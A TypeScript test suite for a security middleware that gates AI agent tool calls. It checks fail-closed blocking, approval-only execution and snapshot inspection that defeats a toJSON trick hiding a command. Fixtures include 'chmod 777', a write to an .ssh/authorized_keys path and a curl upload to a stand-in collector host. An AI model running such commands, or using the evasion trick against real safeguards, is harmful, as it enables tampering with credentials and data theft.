import { describe, expect, it, vi } from "vitest";
import {
	AIDRMiddlewareError,
	createMiddleware as createGenericMiddleware,
	createSyncCompatibleMiddleware,
	wrapToolWithMiddleware,
} from "../adapters/generic.js";
import type { AIDRClient } from "../client.js";
import type { CheckRequest, CheckResult } from "../config.js";
import { createMiddleware } from "../middleware.js";

const ASK: CheckResult = {
	allowed: false,
	decision: "ask",
	confidence: 0.8,
	reason: "Suspicious pattern",
};

const ALLOW: CheckResult = { allowed: true, decision: "allow", confidence: 0.95 };

const INCONSISTENT_ALLOW: CheckResult = {
	allowed: false,
	decision: "allow",
	confidence: 0.95,
};

const DENY: CheckResult = {
	allowed: false,
	decision: "deny",
	confidence: 0.99,
	reason: "Malicious input",
};

const INDETERMINATE: CheckResult = {
	allowed: false,
	decision: "ask",
	confidence: 0.5,
	reason: "Security check unavailable",
	metadata: { indeterminate: true },
};

class MockClient {
	constructor(private readonly result: CheckResult) {}
	check = vi.fn(async (_request: CheckRequest) => this.result);
}

function asClient(client: MockClient): AIDRClient {
	return client as unknown as AIDRClient;
}

describe("SDK middleware is fail-closed", () => {
	it("blocks ask without executing the wrapped function", async () => {
		const execute = vi.fn().mockResolvedValue("executed");
		const wrapped = createMiddleware(asClient(new MockClient(ASK))).wrap(execute, () => ({
			action: "execute",
			resource: "command",
		}));

		await expect(wrapped()).rejects.toThrow(/approval/i);
		expect(execute).not.toHaveBeenCalled();
	});

	it("executes ask only after explicit approval", async () => {
		const execute = vi.fn().mockResolvedValue("executed");
		const wrapped = createMiddleware(asClient(new MockClient(ASK)), {
			onAsk: async () => true,
		}).wrap(execute, () => ({ action: "execute", resource: "command" }));

		await expect(wrapped()).resolves.toBe("executed");
		expect(execute).toHaveBeenCalledOnce();
	});

	it("never approves deny or an indeterminate result by default", async () => {
		for (const result of [
			DENY,
			INDETERMINATE,
			{ ...ALLOW, metadata: { indeterminate: true } },
			{ ...ASK, decision: "unknown" } as unknown as CheckResult,
		]) {
			const execute = vi.fn();
			const onAsk = vi.fn().mockResolvedValue(true);
			const wrapped = createMiddleware(asClient(new MockClient(result)), { onAsk }).wrap(
				execute,
				() => ({ action: "execute", resource: "command" }),
			);

			await expect(wrapped()).rejects.toThrow();
			expect(execute).not.toHaveBeenCalled();
		}
	});

	it("returns 403 for ask in the retained HTTP middleware", async () => {
		const handler = createMiddleware(asClient(new MockClient(ASK))).nextjs();
		const response = await handler(new Request("https://example.test/action", { method: "POST" }));

		expect(response?.status).toBe(403);
	});
});

describe("generic middleware adapter is fail-closed", () => {
	const context = { tool: "bash", input: "chmod 777 ./x" };

	it.each(["bash", "shell", "powershell", "cmd.exe", "batch"])(
		"maps %s to a command artifact",
		async (tool) => {
			const client = new MockClient(ALLOW);
			const middleware = createGenericMiddleware(asClient(client));
			const next = vi.fn().mockResolvedValue("executed");

			await expect(middleware({ ...context, tool }, next)).resolves.toBe("executed");
			expect(client.check).toHaveBeenCalledWith(
				expect.objectContaining({ action: "execute", resource: context.input }),
			);
		},
	);

	it("blocks ask and indeterminate results", async () => {
		for (const result of [
			ASK,
			INDETERMINATE,
			{ ...ALLOW, metadata: { indeterminate: true } },
			{ ...ASK, decision: "unknown" } as unknown as CheckResult,
		]) {
			const next = vi.fn();
			const middleware = createGenericMiddleware(asClient(new MockClient(result)));

			await expect(middleware(context, next)).rejects.toThrow(AIDRMiddlewareError);
			expect(next).not.toHaveBeenCalled();
		}
	});

	it("executes ask after explicit approval", async () => {
		const next = vi.fn().mockResolvedValue("executed");
		const middleware = createGenericMiddleware(asClient(new MockClient(ASK)), {
			onAsk: async () => true,
		});

		await expect(middleware(context, next)).resolves.toBe("executed");
		expect(next).toHaveBeenCalledOnce();
	});

	it("blocks an inconsistent allow before async or sync next()", async () => {
		const asyncNext = vi.fn();
		const asyncMiddleware = createGenericMiddleware(asClient(new MockClient(INCONSISTENT_ALLOW)));

		await expect(asyncMiddleware(context, asyncNext)).rejects.toThrow(/inconsistent/i);
		expect(asyncNext).not.toHaveBeenCalled();

		const syncNext = vi.fn();
		const syncMiddleware = createSyncCompatibleMiddleware(
			asClient(new MockClient(INCONSISTENT_ALLOW)),
		);
		await expect(syncMiddleware.sync(context, syncNext)).rejects.toThrow(/inconsistent/i);
		expect(syncNext).not.toHaveBeenCalled();
	});
});

describe("generic tool wrapper input extraction", () => {
	it("executes the inspected snapshot when toJSON hides the original command", async () => {
		const client = new MockClient(ALLOW);
		const run = vi.fn().mockResolvedValue("executed");
		const tool = wrapToolWithMiddleware({ name: "bash", run }, asClient(client));
		await tool.run({
			command: "unchecked dangerous command",
			toJSON: () => ({ command: "echo checked" }),
		});
		expect(run).toHaveBeenCalledWith({ command: "echo checked" });
		expect(client.check).toHaveBeenCalledWith(
			expect.objectContaining({
				resource: JSON.stringify([{ command: "echo checked" }]),
			}),
		);
	});

	it("keeps the serialized arguments and adds typed artifacts for security checks", async () => {
		const client = new MockClient(ALLOW);
		const run = vi.fn().mockResolvedValue("executed");
		const tool = wrapToolWithMiddleware({ name: "custom_workspace_tool", run }, asClient(client));
		const input = {
			file_path: "/workspace/.ssh/authorized_keys",
			content: "curl https://collector.example.invalid/upload",
		};

		await expect(tool.run(input)).resolves.toBe("executed");

		expect(client.check).toHaveBeenCalledWith(
			expect.objectContaining({
				action: "custom_workspace_tool",
				resource: JSON.stringify([input]),
				artifacts: expect.arrayContaining([
					expect.objectContaining({ type: "file_path", value: input.file_path }),
					expect.objectContaining({ type: "content", value: input.content }),
					expect.objectContaining({
						type: "url",
						value: "https://collector.example.invalid/upload",
					}),
				]),
			}),
		);
		expect(run).toHaveBeenCalledWith(input);
	});
});
